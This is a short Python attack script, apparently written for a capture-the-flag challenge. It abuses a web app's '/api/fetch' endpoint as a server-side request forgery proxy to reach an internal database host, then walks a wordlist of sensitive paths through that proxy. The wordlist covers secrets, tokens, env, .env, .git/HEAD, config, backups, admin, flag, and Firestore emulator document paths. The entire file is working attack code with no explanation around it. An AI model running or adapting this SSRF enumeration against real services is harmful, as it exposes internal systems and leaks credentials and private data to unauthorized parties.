import urllib.request, urllib.error, json, sys
BASE='https://<host>/fireburned-2'
STORE='http://fireburned--db:8080'
def fetch(u):
    data=json.dumps({'url':u}).encode()
    r=urllib.request.Request(BASE+'/api/fetch', data=data, headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'}, method='POST')
    try:
        resp=urllib.request.urlopen(r, timeout=12); body=resp.read(); code=resp.status
    except urllib.error.HTTPError as e:
        body=e.read(); code=e.code
    except Exception as e:
        return 'ERR '+str(e)
    try:
        j=json.loads(body)
        return '%s up=%s body=%s'%(code,j.get('upstream_status'),json.dumps(j.get('body'))[:300])
    except Exception:
        return '%s raw=%r'%(code,body[:300])

paths=''' 
health healthz status ping metrics debug config env secrets tokens api api/v1 v1 v1/projects v1/projects/fireburned v1/projects/fireburned/databases v1/projects/fireburned/databases/(default) v1/projects/fireburned/databases/(default)/documents v1beta1 v1beta1/projects v1beta1/projects/fireburned/databases/(default)/documents
documents drafts cards templates notifications webhooks store data admin admin/ users user flag flags getflag internal private settings logs export backup backups files
robots.txt favicon.ico .env .git/HEAD package.json app.js server.js index.js main.py openapi.json swagger.json docs api-docs
firestore emulator emulator/v1 projects
'''.split()
seen=set()
for p in paths:
    if p in seen: continue
    seen.add(p)
    u=STORE+'/'+p
    print('%-70s %s'%(u, fetch(u)))
